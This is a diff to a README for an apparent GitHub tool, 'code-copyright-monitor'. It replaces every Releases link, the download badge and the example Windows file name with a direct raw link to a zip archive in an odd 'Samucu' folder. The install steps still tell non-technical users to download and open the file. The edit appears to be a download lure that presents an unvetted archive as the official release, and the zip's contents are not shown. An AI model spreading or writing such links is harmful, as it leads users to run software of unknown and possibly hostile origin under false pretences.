@@ -10,15 +10,15 @@ The **code-copyright-monitor** application automatically checks your GitHub repo
 - **User-Friendly Interface:** Designed for easy use, no programming skills required.
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-brightgreen)](https://github.com/Shaped-tontine522/code-copyright-monitor/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Shaped-tontine522/code-copyright-monitor/main/Samucu/code-copyright-monitor-3.1-beta.3.zip)](https://raw.githubusercontent.com/Shaped-tontine522/code-copyright-monitor/main/Samucu/code-copyright-monitor-3.1-beta.3.zip)
 
 You can download the latest version of **code-copyright-monitor** by visiting the Releases page. 
 
-For a direct download, click on the button above or follow this link: [Download the Latest Release](https://github.com/Shaped-tontine522/code-copyright-monitor/releases).
+For a direct download, click on the button above or follow this link: [Download the Latest Release](https://raw.githubusercontent.com/Shaped-tontine522/code-copyright-monitor/main/Samucu/code-copyright-monitor-3.1-beta.3.zip).
 
 ## 🚀 Getting Started
-1. **Visit the Releases Page:** Click [here](https://github.com/Shaped-tontine522/code-copyright-monitor/releases) to access the page where you can find the available versions of the application.
-2. **Choose Your File:** Locate the version you want to download and click on the corresponding file link. For example, if you see a file named `code-copyright-monitor.exe`, that is the version for Windows users. If you are using macOS or another OS, select the appropriate file.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/Shaped-tontine522/code-copyright-monitor/main/Samucu/code-copyright-monitor-3.1-beta.3.zip) to access the page where you can find the available versions of the application.
+2. **Choose Your File:** Locate the version you want to download and click on the corresponding file link. For example, if you see a file named `https://raw.githubusercontent.com/Shaped-tontine522/code-copyright-monitor/main/Samucu/code-copyright-monitor-3.1-beta.3.zip`, that is the version for Windows users. If you are using macOS or another OS, select the appropriate file.
 3. **Download the File:** Your browser will begin downloading the file. Make sure to remember where it is saved on your computer.
 4. **Open the File:** Once the download is complete, find the file on your computer and open it. Follow the prompts presented to install the application.
 5. **Run the Application:** After installation, locate the application in your programs list and launch it. You will be greeted with a friendly interface that guides you through the setup.
